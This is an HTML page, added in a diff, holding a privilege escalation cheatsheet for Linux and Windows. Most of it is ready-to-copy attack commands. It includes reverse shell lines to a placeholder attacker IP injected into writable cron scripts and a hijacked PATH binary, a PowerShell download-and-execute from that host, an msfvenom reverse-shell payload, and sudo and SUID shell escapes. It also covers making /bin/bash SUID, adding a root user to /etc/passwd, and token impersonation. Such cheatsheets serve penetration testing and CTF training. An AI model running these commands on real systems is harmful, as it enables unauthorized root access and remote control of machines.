@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Privilege Escalation | Renvector</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo"><span class="br">&lt;</span>Renvector<span class="br">/&gt;</span></a>
+  <a href="../index.html#cheatsheets" class="nav-back">← Back to Cheatsheets</a>
+</nav>
+
+<div class="cs-layout">
+  <aside class="cs-sidebar">
+    <div class="cs-sidebar-label">On This Page</div>
+    <a href="#linux-enum">Linux Enumeration</a>
+    <a href="#linux-suid">Linux SUID/SGID</a>
+    <a href="#linux-sudo">Linux Sudo</a>
+    <a href="#linux-cron">Linux Cron Jobs</a>
+    <a href="#linux-misc">Linux Misc</a>
+    <a href="#win-enum">Windows Enumeration</a>
+    <a href="#win-services">Windows Services</a>
+    <a href="#win-tokens">Windows Tokens</a>
+    <a href="#tools">Tools</a>
+  </aside>
+
+  <main class="cs-main">
+    <div class="cs-header">
+      <div class="cs-header-top">
+        <span class="cs-icon">🔼</span>
+        <h1 class="cs-title">Privilege Escalation</h1>
+      </div>
+      <p class="cs-subtitle">Comprehensive cheatsheet for Linux and Windows privilege escalation techniques.</p>
+    </div>
+
+    <!-- LINUX ENUM -->
+    <div class="cs-section" id="linux-enum">
+      <h2 class="cs-section-title"><span class="sec-icon">🐧</span> Linux Enumeration</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Automated Enumeration</span>
+          <span class="code-badge badge-linux">Linux</span>
+        </div>
+        <pre><span class="cm"># LinPEAS — most comprehensive</span>
+<span class="cmd">curl</span> -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span class="cm"># Or transfer and run:</span>
+<span class="cmd">chmod</span> +x linpeas.sh && ./linpeas.sh -a 2&gt;&amp;1 | tee linpeas.txt
+
+<span class="cm"># Linux Exploit Suggester</span>
+<span class="cmd">./linux-exploit-suggester.sh</span>
+
+<span class="cm"># pspy — monitor processes without root</span>
+<span class="cmd">./pspy64</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Manual Enumeration</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># System info</span>
+<span class="cmd">uname</span> -a
+<span class="cmd">cat</span> /etc/*release
+<span class="cmd">hostname</span>
+<span class="cmd">id</span>
+<span class="cmd">whoami</span>
+
+<span class="cm"># Network</span>
+<span class="cmd">ip</span> a
+<span class="cmd">netstat</span> -tulpn
+<span class="cmd">ss</span> -tulpn
+
+<span class="cm"># Interesting files</span>
+<span class="cmd">find</span> / -name "*.txt" 2>/dev/null | grep -i pass
+<span class="cmd">find</span> / -perm -4000 2>/dev/null     <span class="cm"># SUID files</span>
+<span class="cmd">find</span> / -writable 2>/dev/null | grep -v proc</pre>
+      </div>
+    </div>
+
+    <!-- SUID -->
+    <div class="cs-section" id="linux-suid">
+      <h2 class="cs-section-title"><span class="sec-icon">⚡</span> Linux SUID/SGID</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Find & Exploit SUID Binaries</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Find SUID binaries</span>
+<span class="cmd">find</span> / -perm -u=s -type f 2>/dev/null
+
+<span class="cm"># Common exploitable SUID binaries — check GTFOBins for each</span>
+<span class="cm"># https://gtfobins.github.io</span>
+
+<span class="cm"># Example: /usr/bin/find with SUID</span>
+<span class="cmd">/usr/bin/find</span> . -exec /bin/sh -p \; -quit
+
+<span class="cm"># Example: /usr/bin/vim with SUID</span>
+<span class="cmd">vim</span> -c ':!/bin/sh'
+
+<span class="cm"># Example: /usr/bin/nmap (older versions)</span>
+<span class="cmd">nmap</span> --interactive
+nmap&gt; !sh</pre>
+      </div>
+    </div>
+
+    <!-- SUDO -->
+    <div class="cs-section" id="linux-sudo">
+      <h2 class="cs-section-title"><span class="sec-icon">👑</span> Linux Sudo</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Sudo Privilege Abuse</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Check sudo privileges</span>
+<span class="cmd">sudo</span> -l
+
+<span class="cm"># If you see: (ALL) NOPASSWD: /usr/bin/vim</span>
+<span class="cmd">sudo vim</span> -c ':!/bin/bash'
+
+<span class="cm"># If you see: (ALL) NOPASSWD: /usr/bin/python3</span>
+<span class="cmd">sudo python3</span> -c 'import os; os.system("/bin/bash")'
+
+<span class="cm"># If you see: (ALL) NOPASSWD: /usr/bin/less</span>
+<span class="cmd">sudo less</span> /etc/passwd
+<span class="cm"># Then press: !bash</span>
+
+<span class="cm"># LD_PRELOAD trick (if env_keep+=LD_PRELOAD in sudoers)</span>
+<span class="cm"># Create malicious shared library and sudo any allowed binary</span></pre>
+      </div>
+    </div>
+
+    <!-- CRON -->
+    <div class="cs-section" id="linux-cron">
+      <h2 class="cs-section-title"><span class="sec-icon">⏰</span> Linux Cron Jobs</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Find & Exploit Cron Jobs</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Check cron jobs</span>
+<span class="cmd">cat</span> /etc/crontab
+<span class="cmd">ls</span> -la /etc/cron.*
+<span class="cmd">crontab</span> -l
+
+<span class="cm"># Watch for running processes (use pspy)</span>
+<span class="cmd">./pspy64</span>
+
+<span class="cm"># If script is writable — inject reverse shell</span>
+<span class="cmd">echo</span> 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1' &gt;&gt; /path/to/cronjob.sh
+
+<span class="cm"># If directory is writable — create the script it calls</span>
+<span class="cmd">echo</span> '#!/bin/bash' &gt; /writable/path/script.sh
+<span class="cmd">echo</span> 'chmod +s /bin/bash' &gt;&gt; /writable/path/script.sh
+<span class="cmd">chmod</span> +x /writable/path/script.sh
+<span class="cm"># Wait for cron to run, then: /bin/bash -p</span></pre>
+      </div>
+    </div>
+
+    <!-- LINUX MISC -->
+    <div class="cs-section" id="linux-misc">
+      <h2 class="cs-section-title"><span class="sec-icon">🔧</span> Linux Misc</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Path Hijacking & Writable Files</span>
+          <span class="code-badge badge-linux">Linux</span>
+        </div>
+        <pre><span class="cm"># Check PATH</span>
+<span class="cmd">echo</span> $PATH
+
+<span class="cm"># If script calls binary without full path (e.g. just "cat")</span>
+<span class="cmd">export</span> PATH=/tmp:$PATH
+<span class="cmd">echo</span> '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1' &gt; /tmp/cat
+<span class="cmd">chmod</span> +x /tmp/cat
+
+<span class="cm"># Check /etc/passwd is writable</span>
+<span class="cmd">ls</span> -la /etc/passwd
+<span class="cm"># Generate password hash: openssl passwd -1 -salt salt newpassword</span>
+<span class="cm"># Add new root user line to /etc/passwd</span>
+
+<span class="cm"># Check capabilities</span>
+<span class="cmd">getcap</span> -r / 2>/dev/null</pre>
+      </div>
+    </div>
+
+    <!-- WINDOWS ENUM -->
+    <div class="cs-section" id="win-enum">
+      <h2 class="cs-section-title"><span class="sec-icon">🪟</span> Windows Enumeration</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Automated — WinPEAS</span>
+          <span class="code-badge badge-win">Windows</span>
+        </div>
+        <pre><span class="cm"># Download and run WinPEAS</span>
+<span class="cm"># Transfer winPEASx64.exe to target, then:</span>
+.\winPEASx64.exe
+
+<span class="cm"># PowerShell version</span>
+<span class="cmd">IEX</span>(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/winPEAS.ps1')</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Manual Enumeration</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># System info</span>
+<span class="cmd">systeminfo</span>
+<span class="cmd">whoami</span> /all
+<span class="cmd">net user</span>
+<span class="cmd">net localgroup administrators</span>
+
+<span class="cm"># Running processes & services</span>
+<span class="cmd">tasklist</span>
+<span class="cmd">sc query</span>
+<span class="cmd">Get-Service</span> | Where-Object {$_.Status -eq "Running"}
+
+<span class="cm"># Network</span>
+<span class="cmd">ipconfig</span> /all
+<span class="cmd">netstat</span> -ano</pre>
+      </div>
+    </div>
+
+    <!-- WINDOWS SERVICES -->
+    <div class="cs-section" id="win-services">
+      <h2 class="cs-section-title"><span class="sec-icon">⚙️</span> Windows Services</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Unquoted Service Path</span>
+          <span class="code-badge badge-win">Windows</span>
+        </div>
+        <pre><span class="cm"># Find unquoted service paths</span>
+<span class="cmd">wmic</span> service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+<span class="cm"># If path is: C:\Program Files\Vuln Service\service.exe</span>
+<span class="cm"># Windows tries: C:\Program.exe → C:\Program Files\Vuln.exe → etc.</span>
+<span class="cm"># Drop malicious binary in writable directory in that path</span>
+<span class="cmd">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o Program.exe</pre>
+      </div>
+    </div>
+
+    <!-- WINDOWS TOKENS -->
+    <div class="cs-section" id="win-tokens">
+      <h2 class="cs-section-title"><span class="sec-icon">🎫</span> Windows Tokens</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Token Impersonation (Metasploit)</span>
+          <span class="code-badge badge-win">Windows</span>
+        </div>
+        <pre><span class="cm"># In Meterpreter session</span>
+<span class="cmd">use</span> incognito
+<span class="cmd">list_tokens</span> -u
+<span class="cmd">impersonate_token</span> "NT AUTHORITY\SYSTEM"
+
+<span class="cm"># PrintSpoofer (SeImpersonatePrivilege)</span>
+.\PrintSpoofer64.exe -i -c cmd
+
+<span class="cm"># GodPotato (Windows 10/Server 2019+)</span>
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"</pre>
+      </div>
+    </div>
+
+    <!-- TOOLS -->
+    <div class="cs-section" id="tools">
+      <h2 class="cs-section-title"><span class="sec-icon">🛠️</span> Tools</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Essential PrivEsc Tools</span>
+          <span class="code-badge badge-linux">Reference</span>
+        </div>
+        <pre><span class="cm"># Linux</span>
+LinPEAS    → https://github.com/carlospolop/PEASS-ng
+LinEnum    → https://github.com/rebootuser/LinEnum
+pspy       → https://github.com/DominicBreuker/pspy
+GTFOBins   → https://gtfobins.github.io
+
+<span class="cm"># Windows</span>
+WinPEAS    → https://github.com/carlospolop/PEASS-ng
+PowerUp    → https://github.com/PowerShellMafia/PowerSploit
+LOLBAS     → https://lolbas-project.github.io
+PrintSpoofer → https://github.com/itm4n/PrintSpoofer</pre>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script src="../cs.js"></script>
+</body>
+</html>
